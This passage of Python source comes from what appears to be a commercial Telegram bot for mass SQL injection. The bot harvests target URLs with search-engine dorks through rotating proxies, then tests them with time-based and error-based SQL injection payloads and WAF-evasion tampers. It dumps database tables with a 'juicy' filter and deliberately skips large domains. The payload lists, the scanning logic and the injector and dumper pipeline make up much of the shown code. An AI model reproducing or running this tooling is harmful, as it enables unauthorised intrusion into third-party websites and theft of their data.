            threading.Thread(target=run_gen,args=(m.chat.id,uid,kws,n)).start()
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="pipe_kw":
        kws=lines_of(text)
        if not kws: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INPUT IS EMPTY!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states.pop(uid,None)
        jid=new_job()
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['rocket']} STARTING PIPELINE...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
        threading.Thread(target=pipeline_run,args=(m.chat.id,uid,msg.message_id,jid,kws,500,True)).start()
    elif name=="combo_name":
        with STATES_LOCK: states[uid]=("combo_kws",{"name":text.strip()})
        set_cur(uid,"combo_kws"); bot.send_message(m.chat.id, f"<blockquote><b>{E['brain']} SEND KEYWORDS (TEXT/.TXT):</b></blockquote>", parse_mode="HTML")
    elif name=="combo_kws":
        kws=lines_of(text)
        if not kws: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        cb_db=load_json(COMBOS,{}); cs=cb_db.setdefault(str(uid),{})
        cs[data["name"]]=kws[:500]; save_json(COMBOS,cb_db)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['disk']} COMBO SAVED\n{LINE}\nNAME: {data['name']}\nKEYWORDS: {len(kws)}</b></blockquote>", parse_mode="HTML")
    elif name=="subs_dom":
        dom=text.strip().replace("https://","").replace("http://","").split("/")[0]
        if "." not in dom: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID DOMAIN!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states.pop(uid,None)
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['web']} SCANNING DOMAIN...</b></blockquote>", parse_mode="HTML")
        threading.Thread(target=run_subs,args=(m.chat.id,uid,msg.message_id,dom)).start()
    elif name=="km_kw":
        kws=lines_of(text)
        if not kws: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("km_count",{"kws":kws})
        set_cur(uid,"km_count")
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("100","kmc:100"),btn("500","kmc:500"),btn("1K","kmc:1000"))
        mk.row(btn("5K","kmc:5000"),btn("10K","kmc:10000"))
        back_row(mk)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['brain']} LOADED {len(kws)} KEYWORDS.\n{E['gear']} HOW MANY TO GENERATE?</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif name=="km_count":
        try:
            n=int(text.replace(",","").strip())
            with STATES_LOCK: kws=states.pop(uid)[1]["kws"]
            threading.Thread(target=run_km,args=(m.chat.id,uid,kws,n)).start()
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="gen_kw":
        kws=lines_of(text)
        if not kws: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("gen_count",{"kws":kws})
        set_cur(uid,"gen_count"); ask_count(m.chat.id)
    elif name=="gen_count":
        try: start_gen(m.chat.id,uid,int(text.replace(",","").strip()))
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="parse_dorks":
        dorks=lines_of(text)
        if not dorks: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("parse_threads",{"dorks":dorks})
        set_cur(uid,"parse_threads")
        # 🚨 Limit 1-200 ki hai
        bot.send_message(m.chat.id, f"<blockquote><b>{E['gear']} ENTER THREADS (1-200):</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
        
    elif name=="parse_threads":
        try: th=int(text.strip())
        except: th=0
        # 🚨 Yahan bhi 200 set kiya
        if not (1<=th<=200):
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} THREADS MUST BE BETWEEN 1 AND 200!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK:
            data["threads"]=th; states[uid]=("parse_pages",data)
        set_cur(uid,"parse_pages")
        bot.send_message(m.chat.id, f"<blockquote><b>{E['folder']} ENTER PAGES TO SCRAPE (1-5):</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
        
    elif name=="parse_pages":
        try: pg=int(text.strip())
        except: pg=0
        if not (1<=pg<=5):
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} PAGES MUST BE BETWEEN 1 AND 5!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK:
            data["pages"]=pg; states[uid]=("parse_workers",data)
        set_cur(uid,"parse_workers")
        bot.send_message(m.chat.id, f"<blockquote><b>{E['robot']} ENTER WORKERS (1-100):</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
        
    elif name=="parse_workers":
        try: wk=int(text.strip())
        except: wk=0
        if not (1<=wk<=100):
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} WORKERS MUST BE BETWEEN 1 AND 100!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK:
            data["workers"]=wk; states[uid]=("parse_engine",data)
        set_cur(uid,"parse_eng")
        
        mk=types.InlineKeyboardMarkup()
        mk.row(sbtn("ALL ENGINES","peng:all","success"))
        mk.row(btn("DDG","peng:ddg"),btn("BING","peng:bing"))
        mk.row(btn("YAHOO","peng:yahoo"),btn("BRAVE","peng:brave"))
        mk.row(btn("MOJEEK","peng:mojeek"),btn("ECOSIA","peng:ecosia"))
        mk.row(btn("ASK","peng:ask"),btn("YEP","peng:yep"))
        mk.row(btn("GOOGLE","peng:google"))
        mk.row(btn("24H","fresh:d"),btn("WEEK","fresh:w"),btn("ALL TIME","fresh:"))
        back_row(mk)
        
        bot.send_message(m.chat.id, f"<blockquote><b>{E['globe']} PARSER SETUP\n{LINE}\n{E['dna']} DORKS: {len(data['dorks'])}\n{E['gear']} THREADS: {data['threads']} | 📄 PAGES: {data['pages']} | 👷 WORKERS: {data['workers']}\n\nSELECT FRESHNESS & ENGINE:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif name=="dump_urls":
        urls=[x for x in lines_of(text) if x.startswith("http")]
        if not urls: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} NO VALID URLS FOUND!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("inject_threads",{"urls":urls})
        set_cur(uid,"inject_threads")
        bot.send_message(m.chat.id, f"<blockquote><b>{E['gear']} ENTER THREADS (1-30):</b></blockquote>", reply_markup=back_row(types.InlineKeyboardMarkup()), parse_mode="HTML")
    elif name=="inject_threads":
        try: th=int(text.strip())
        except: th=0
        if not (1<=th<=30):
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} THREADS MUST BE BETWEEN 1 AND 30!</b></blockquote>", parse_mode="HTML"); return
        urls=data["urls"]
        with STATES_LOCK: states.pop(uid,None)
        jid=new_job(); mode=get_mode(uid)
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['syringe']} STARTING INJECTOR...</b></blockquote>", reply_markup=stop_markup(jid), parse_mode="HTML")
        threading.Thread(target=turbo_inject,args=(m.chat.id,uid,msg.message_id,jid,urls,mode,th)).start()
    elif name=="data_urls":
        urls=[x for x in lines_of(text) if x.startswith("http")]
        if not urls: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        with STATES_LOCK: states[uid]=("data_filter",{"urls":urls})
        set_cur(uid,"data_filter")
        mk=types.InlineKeyboardMarkup()
        mk.row(btn("ALL TABLES","dfilt:all"),btn("JUICY ONLY","dfilt:juicy"))
        back_row(mk)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['target']} SELECT TABLE FILTER:</b></blockquote>", reply_markup=mk, parse_mode="HTML")
    elif name=="proxy_add":
        raw_prx=lines_of(text)
        if not raw_prx: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        
        # Auto-Format user input
        prx = [format_proxy(p) for p in raw_prx if format_proxy(p)]
        with STATES_LOCK: states.pop(uid,None)
        
        # Automatically Check before saving
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['search']} FORMATTING & CHECKING {len(prx)} NEW PROXIES...</b></blockquote>", parse_mode="HTML")
        threading.Thread(target=run_check,args=(m.chat.id,uid,msg.message_id,prx)).start()
        
    elif name=="proxy_check":
        raw_prx=lines_of(text)
        if not raw_prx: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        
        # Auto-Format user input
        prx = [format_proxy(p) for p in raw_prx if format_proxy(p)]
        with STATES_LOCK: states.pop(uid,None)
        
        msg=bot.send_message(m.chat.id, f"<blockquote><b>{E['search']} FORMATTING & CHECKING {len(prx)} PROXIES...</b></blockquote>", parse_mode="HTML")
        threading.Thread(target=run_check,args=(m.chat.id,uid,msg.message_id,prx)).start()        
    elif name=="set_autoint":
        try:
            st=S(); st["auto_interval"]=max(1,int(text.strip())); setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['gear']} INTERVAL SET TO: {st['auto_interval']}H</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="set_autodorks":
        try:
            st=S(); st["auto_dorks"]=min(2000,max(100,int(text.strip()))); setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['dna']} DORKS PER CYCLE SET TO: {st['auto_dorks']}</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="set_channel":
        st=S(); u2=text.strip()
        if not u2.startswith("@"): u2="@"+u2
        st["results_channel"]=u2; setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['horn']} CHANNEL SET TO: {u2}</b></blockquote>", parse_mode="HTML")
    elif name=="sched_hour":
        try:
            st=S(); st.setdefault("sched",{})["hour"]=int(text.strip())%24; setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['gear']} SCHEDULE HOUR SET</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="sched_dorks":
        dorks=lines_of(text)
        st=S(); st.setdefault("sched",{})["dorks"]=dorks; setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} {len(dorks)} DORKS SAVED FOR SCHEDULE</b></blockquote>", parse_mode="HTML")
    elif name=="plan_name":
        with STATES_LOCK: states[uid]=("plan_price",{"name":text.strip()})
        bot.send_message(m.chat.id, f"<blockquote><b>{E['money']} ENTER PRICE:</b></blockquote>", parse_mode="HTML")
    elif name=="plan_price":
        with STATES_LOCK: states[uid]=("plan_days",{"name":data["name"],"price":text.strip()})
        bot.send_message(m.chat.id, f"<blockquote><b>{E['gear']} ENTER DURATION (DAYS):</b></blockquote>", parse_mode="HTML")
    elif name=="plan_days":
        try:
            days=int(text.strip())
            st=S(); ps=st.get("plans",plans())
            ps.append({"name":data["name"],"price":data["price"],"days":days})
            st["plans"]=ps; setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} PLAN ADDED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="support":
        with STATES_LOCK: states.pop(uid,None)
        mk=types.InlineKeyboardMarkup(); mk.add(btn("REPLY",f"reply:{uid}"))
        for a in admins():
            try: bot.send_message(a, f"<blockquote><b>{E['horn']} SUPPORT MESSAGE\n{LINE}\nUSER: {uid}\n\n{text}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
            except: pass
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} MESSAGE SENT TO SUPPORT!</b></blockquote>", parse_mode="HTML")
    elif name=="adm_reply":
        with STATES_LOCK: states.pop(uid,None)
        try: bot.send_message(data["uid"], f"<blockquote><b>{E['horn']} ADMIN REPLY:\n\n{text}</b></blockquote>", parse_mode="HTML")
        except: pass
    elif name=="bcast_uid":
        try:
            with STATES_LOCK: states[uid]=("bcast",{"target":int(text.strip())})
            bot.send_message(m.chat.id, f"<blockquote><b>{E['horn']} ENTER MESSAGE TO BROADCAST:</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="bcast":
        with STATES_LOCK: states.pop(uid,None)
        tgt=data["target"]
        ids=[tgt] if tgt!="all" else [int(k) for k in load_json(USERS_DB,{}).keys()]
        ok=0
        for i in ids:
            try: 
                bot.send_message(i, f"<blockquote><b>{E['horn']} BROADCAST\n{LINE}\n\n{text}</b></blockquote>", parse_mode="HTML")
                ok+=1
            except: pass
            time.sleep(0.05)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} BROADCAST SENT TO {ok}/{len(ids)} USERS</b></blockquote>", parse_mode="HTML")
    elif name=="ch_add":
        t=text.strip(); rec=None
        try:
            if t.startswith("http"):
                inv=bot.check_chat_invite_link(t)
                rec={"id":inv.chat.id,"name":inv.chat.title or "channel","link":t}
            else:
                if not t.startswith("@"): t="@"+t
                ch=bot.get_chat(t)
                rec={"id":ch.id,"name":ch.title,"link":("https://t.me/"+ch.username) if ch.username else None}
        except:
            bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID CHANNEL OR LINK!</b></blockquote>", parse_mode="HTML")
            with STATES_LOCK: states.pop(uid,None)
            return
        if not rec["link"]:
            with STATES_LOCK: states[uid]=("ch_link",{"rec":rec})
            bot.send_message(m.chat.id, f"<blockquote><b>{E['web']} ENTER INVITE LINK:</b></blockquote>", parse_mode="HTML"); return
        st=S(); st.setdefault("channels",[]).append(rec); setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} CHANNEL ADDED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
    elif name=="ch_link":
        rec=data["rec"]; rec["link"]=text.strip()
        st=S(); st.setdefault("channels",[]).append(rec); setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} UPDATED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
    elif name in ("set_huntbelow","set_refneed","set_refdays","set_flaglim"):
        try:
            n=int(text.strip()); st=S()
            key={"set_huntbelow":"hunt_below","set_refneed":"ref_need","set_refdays":"ref_reward_days","set_flaglim":"flag_threshold"}[name]
            st[key]=n; setS(st)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} {key.upper()} SET TO {n}</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="set_price":
        st=S(); st["sc_price"]=text.strip(); setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} UPDATED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
    elif name=="set_contact":
        st=S(); st["sc_contact"]=text.strip(); setS(st)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} UPDATED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
    elif name=="user_redeem":
        with STATES_LOCK: states.pop(uid,None)
        result = redeem(uid,text.strip())
        bot.send_message(m.chat.id, f"<blockquote><b>{result}</b></blockquote>", parse_mode="HTML")
    elif name=="adm_hours":
        try:
            h=int(text.strip())
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['ticket']} KEY GENERATED:\n<code>{make_key(uid,h)}</code></b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="adm_addadmin":
        try:
            a=admins(); a.append(int(text.strip())); save_json(ADMINS_DB,a)
            with STATES_LOCK: states.pop(uid,None)
            bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} ADMIN ADDED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")
        except: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML")
    elif name=="res_edit":
        if text is None: bot.send_message(m.chat.id, f"<blockquote><b>{E['cross']} INVALID INPUT!</b></blockquote>", parse_mode="HTML"); return
        with open(RES_FILES[data["name"]],"w",encoding="utf-8") as f: f.write(text)
        with STATES_LOCK: states.pop(uid,None)
        bot.send_message(m.chat.id, f"<blockquote><b>{E['tick']} RESOURCE UPDATED SUCCESSFULLY!</b></blockquote>", parse_mode="HTML")

# ============ 💾 JOBS PERSIST + RESUME v2 ============
JOBS_P=P("jobs_persist.json"); JOBS_DATA=P("jobs_data")
try: os.makedirs(JOBS_DATA,exist_ok=True)
except: pass
try: LAST_FILE
except NameError: LAST_FILE=P("last_cache.json")
try: AUTO_FILE
except NameError: AUTO_FILE=P("auto_persist.json")

def jp_load(): return load_json(JOBS_P,{})
def jp_save(d): save_json(JOBS_P,d)
def jp_reg(jid,kind,uid,cid,meta):
    d=jp_load(); d[jid]={"kind":kind,"uid":uid,"cid":cid,"meta":meta,"t":int(time.time())}; jp_save(d)
def jp_unreg(jid):
    d=jp_load(); d.pop(jid,None); jp_save(d)
    for ext in (".dorks",".state",".urls"):
        try: os.remove(os.path.join(JOBS_DATA,jid+ext))
        except: pass
def jp_pop(jid):
    d=jp_load(); e=d.pop(jid,None); jp_save(d); return e

TIME_PAY=[("' AND SLEEP(5)-- ","MySQL"),("' OR SLEEP(5)-- ","MySQL"),("' AND pg_sleep(5)-- ","PostgreSQL"),("'; WAITFOR DELAY '0:0:5'-- ","MSSQL"),("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ","Oracle")]
def tamper_comment(p): return p.replace(" ","/**/")
def tamper_urlenc(p): return p.replace("'","%27").replace(" ","%20")
TAMPERS=[tamper_comment,tamper_urlenc]

def _last_saver():
    prev=None; loaded=False
    while True:
        try:
            if not loaded:
                LAST.update(load_json(LAST_FILE,{})); loaded=True
            cur=json.dumps(LAST,sort_keys=True)
            if cur!=prev: save_json(LAST_FILE,LAST); prev=cur
        except: pass
        time.sleep(5)

def _auto_saver():
    t0=time.time()
    while True:
        try:
            if AUTO or time.time()-t0>20:
                save_json(AUTO_FILE,{str(u):{"done":v["done"],"limit":v["limit"]} for u,v in AUTO.items()})
        except: pass
        time.sleep(5)

threading.Thread(target=_last_saver,daemon=True).start()
threading.Thread(target=_auto_saver,daemon=True).start()
LIVE={}

def _partial_sender(jid,cid):
    time.sleep(10)
    e=LIVE.pop(jid,None)
    if not e: return
    try:
        if e["kind"]=="parse":
            urls=uhq_filter(scope_filter(e["results"]))
            if urls:
                send_doc(cid,("\n".join(urls)+"\n").encode(),"urls_partial.txt")
                bot.send_message(cid, f"<blockquote><b>{E['globe']} PARTIAL PARSE\n{LINE}\n{E['tick']} {len(urls)} URLS SAVED</b></blockquote>", parse_mode="HTML")
            else: bot.send_message(cid, f"<blockquote><b>{E['cross']} STOPPED — NO URLS FOUND.</b></blockquote>", parse_mode="HTML")
        elif e["kind"]=="inject":
            vurls=[v["url"] for v in e["vuln"]]
            if vurls:
                send_doc(cid,("\n".join(vurls)+"\n").encode(),"vulnerable_urls.txt")
                bot.send_message(cid, f"<blockquote><b>{E['syringe']} PARTIAL INJECT\n{LINE}\n{E['blood']} VULN: {len(vurls)} | {E['shield']} SAFE: {len(e['nonev'])}</b></blockquote>", parse_mode="HTML")
            else: bot.send_message(cid, f"<blockquote><b>{E['cross']} STOPPED — NO VULNERABILITIES FOUND.</b></blockquote>", parse_mode="HTML")
        elif e["kind"]=="dump":
            if e["dumps"]:
                send_doc(cid,build_zip(e["dumps"]),"data_dump_partial.zip")
                bot.send_message(cid, f"<blockquote><b>{E['blood']} PARTIAL DUMP\n{LINE}\n{E['disk']} {len(e['dumps'])} SITES SAVED</b></blockquote>", parse_mode="HTML")
            else: bot.send_message(cid, f"<blockquote><b>{E['cross']} STOPPED — NO DATA EXTRACTED.</b></blockquote>", parse_mode="HTML")
    except Exception as ex:
        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} PARTIAL BUG: {type(ex).__name__}</b></blockquote>", parse_mode="HTML")
        except: pass

def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15,pages=1,workers=40):
    try:
        proxies=hprox(uid)
        try: save_json(os.path.join(JOBS_DATA,jid+".dorks"),dorks)
        except: pass
        stf=os.path.join(JOBS_DATA,jid+".state"); skip=0; seed=[]
        if os.path.exists(stf):
            try:
                js=load_json(stf,{}); skip=int(js.get("done",0)); seed=js.get("urls",[])
            except: pass
        results=list(seed); seen=set(seed); dorks=dorks[skip:]
        LIVE[jid]={"kind":"parse","results":results}
        jp_reg(jid,"parse",uid,cid,{"threads":threads,"pages":pages,"workers":workers,"fresh":fresh,"engines":engines})
        estat={}; blocked=set(); reqs=[0]; done=[0]; last=[0.0]; t0=time.time(); cooldowns={}
        bump("parse"); bumpU(uid,"parse")
        # 🔥 PROXY ROTATION
        proxy_pool = list(proxies)
        proxy_idx = [0]
        def next_proxy_parse():
            if not proxy_pool: return None
            px = proxy_pool[proxy_idx[0] % len(proxy_pool)]
            proxy_idx[0] += 1
            return px
        if len(proxies)<sget("hunt_below",10):
            threading.Thread(target=turbo_hunt,args=(0,uid,0,0,150),kwargs={"silent":True},daemon=True).start()
        w=ew_get(); engines=sorted(engines,key=lambda e:-w.get(e,0))[:4]
        pgs=max(1,min(5,int(pages))); wks=max(10,min(150,int(workers)))
        cs=max(1,int(sget("admin_chunk_size",5000)))
        chunks=[dorks[i:i+cs] for i in range(0,len(dorks),cs)]; tc=len(chunks)
        async def run():
            conn=aiohttp.TCPConnector(limit=wks+10,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=5)) as s:
                sem=asyncio.Semaphore(threads); act=list(proxies); rc=[0]; alive=[True]
                async def pcheck():
                    if not act: return
                    sc=asyncio.Semaphore(50)
                    async def chk(p):
                        async with sc:
                            for ep in CHECK_EPS[:2]:
                                try:
                                    async with s.get(ep,proxy=p,ssl=False,timeout=aiohttp.ClientTimeout(total=4)) as r:
                                        if r.status==200 and re.search(r"\d{1,3}(\.\d{1,3}){3}",await r.text()): return p
                                except: continue
                            return None
                    al=[x for x in await asyncio.gather(*[chk(p) for p in act]) if x]
                    if al: act[:]=al
                async def editor():
                    ll=[0.0]
                    while alive[0]:
                        await asyncio.sleep(20)
                        now=time.time()
                        if now-ll[0]<20: continue
                        ll[0]=now
                        et=" ".join(f"{v} {k.upper()}" for k,v in sorted(estat.items(),key=lambda x:-x[1]) if v)
                        rps=round(reqs[0]/max(1,now-t0),1)
                        blk=", ".join(sorted(blocked)) if blocked else "NONE"
                        resumed_txt = " [RESUMED]" if skip else ""
                        eta_txt = eta_line(t0, done[0], len(dorks))
                        try: bot.edit_message_text(f"<blockquote><b>{E['globe']} ALONEPARSER {E['zap']}{resumed_txt}\n{LINE}\n🛡️ PROXIES: {len(act)}/{len(proxy_pool)} | 🔄 ROT: {proxy_idx[0]} | {E['zap']} {rps} R/S\n{E['gear']} {threads} THREADS | 👷 {wks} WORKERS | 📄 {pgs} PAGES\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}%\n📊 TOTAL DORKS: {done[0]}/{len(dorks)+skip} | LEFT: {len(dorks)-done[0]}\n{eta_txt}\n{E['globe']} URLS: {len(results)} | {E['cross']} BLOCKED: {blk}\n{E['chart']} HITS: {et}</b></blockquote>", chat_id=cid, message_id=mid, reply_markup=stop_markup(jid), parse_mode="HTML")
                        except: pass
                async def task(d):
                    if stopped(jid): return []
                    rc[0]+=1; reqs[0]+=1
                    if rc[0]%30==0: await pcheck()
                    px=next_proxy_parse()
                    got=[]
                    async with sem:
                        for eng in engines:
                            if eng in blocked: continue
                            if cooldowns.get(eng,0)>time.time(): continue
                            for pg in range(pgs):
                                r,st=await a_eng(s,d,eng,pg,fresh,px)
                                if r is None:
                                    if st in (403,429,503): cooldowns[eng]=time.time()+20
                                    continue
                                estat[eng]=estat.get(eng,0)+len(r)
                                for u in r:
                                    if u not in seen: seen.add(u); got.append(u)
                                break
                            if got: break
                    return got
                ed=asyncio.ensure_future(editor())
                for ci,chunk in enumerate(chunks):
                    if stopped(jid): break
                    for fut in asyncio.as_completed([task(d) for d in chunk]):
                        if stopped(jid): break
                        results.extend(await fut)
                        done[0]+=1
                    if stopped(jid) or ci%10==9:
                        try: save_json(stf,{"done":skip+done[0],"urls":results[:100000]})
                        except: pass
                alive[0]=False
                try: ed.cancel()
                except: pass
        cf=asyncio.run_coroutine_threadsafe(run(),LOOP)
        while not cf.done():
            if stopped(jid):
                try: cf.result(timeout=10)
                except Exception:
                    try: cf.cancel()
                    except: pass
                break
            time.sleep(0.5)
        w2=ew_get()
        for k,v in estat.items():
            if v: w2[k]=w2.get(k,0)+1
        save_json(EW_FILE,w2)
        if stopped(jid):
            clear_markup(cid,mid); jp_unreg(jid); LIVE.pop(jid,None); return
        urls=uhq_filter(scope_filter(dns_filter(results)))
        clear_markup(cid,mid); jp_unreg(jid)
        blk=", ".join(sorted(blocked)) if blocked else "NONE"
        if urls:
            LAST.setdefault(uid,{})["parsed"]=urls
            tag="urls_partial.txt" if stopped(jid) else "urls.txt"
            send_doc(cid,("\n".join(urls)+"\n").encode(),tag,uid)
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("SEND TO INJECTOR","pipe:inject","success"))
            status_txt = "[PARTIAL]" if stopped(jid) else "COMPLETED"
            bot.send_message(cid, f"<blockquote><b>{E['tick']} PARSER {status_txt}\n{LINE}\n{E['globe']} {len(urls)} UHQ URLS FOUND!\n{E['warn']} BLOCKED ENGINES: {blk}</b></blockquote>", reply_markup=mk, parse_mode="HTML")
        else: bot.send_message(cid, f"<blockquote><b>{E['cross']} NO URLS FOUND.\n{E['warn']} BLOCKED ENGINES: {blk}</b></blockquote>", parse_mode="HTML")
    except Exception as e:
        try: bot.send_message(cid, f"<blockquote><b>{E['cross']} PARSER BUG:\n{type(e).__name__}: {e}</b></blockquote>", parse_mode="HTML")
        except: pass

ERROR_SIGS=["you have an error in your sql","right syntax to use","check the manual that corresponds","mysql_fetch_array","mysql_fetch_assoc","mysql_num_rows","mysqli_num_rows","warning: mysql_","warning: mysqli_","mariadb server","pg_query(","pg_exec(","postgresql query failed","sqlite3::query","sqlite_query(","ora-0","oracle error","pl/sql:","odbc sql server driver","microsoft jet database","jet database engine","unclosed quotation mark","unterminated string literal","quoted string not properly terminated","invalid input syntax for type","syntax error at or near","microsoft vb","vbscript runtime error","conversion failed when converting","supplied argument is not a valid","fatal error: uncaught pdoexception","db2 sql error","informix","division by zero"]
WAF_SIGS=["cloudflare","cf-ray","sucuri","wordfence","akamai","incapsula","imperva","attention required","access denied","blocked by","captcha verify","request unsuccessful"]
BIGDOM=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
SCAN_V=3

def dbfam(sig,pay=""):
    if "CONVERT" in pay: return "MSSQL"
    if "CAST" in pay: return "PostgreSQL"
    s=sig.lower()
    if "postgres" in s or "pg_" in s or "invalid input syntax" in s or "pg_sleep" in s: return "PostgreSQL"
    if "ora" in s or "pl/sql" in s or "dbms_pipe" in s: return "Oracle"
    if "odbc" in s or "nvarchar" in s or "varchar value" in s or "microsoft" in s or "jet" in s or "db2" in s or "waitfor" in s: return "MSSQL/Access"
    if "sqlite" in s: return "SQLite"
    if "mariadb" in s: return "MariaDB"
    return "MySQL"

def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
ERR_PAY=["'","\"","')","'-- ","\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]

async def a_scan(s,url,to,tb=False,proxy=None):
    try:
        net=urlparse(url).netloc.lower()
        if any(b in net for b in BIGDOM): return None
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        params=list(query.keys())[:2]; base_c=None
        for pi,param in enumerate(params):
            orig=(query[param] or [""])[0]
            for val in ERR_PAY:
                for vv in [val]+[t(val) for t in TAMPERS]:
                    nq=query.copy(); nq[param]=[orig+vv]
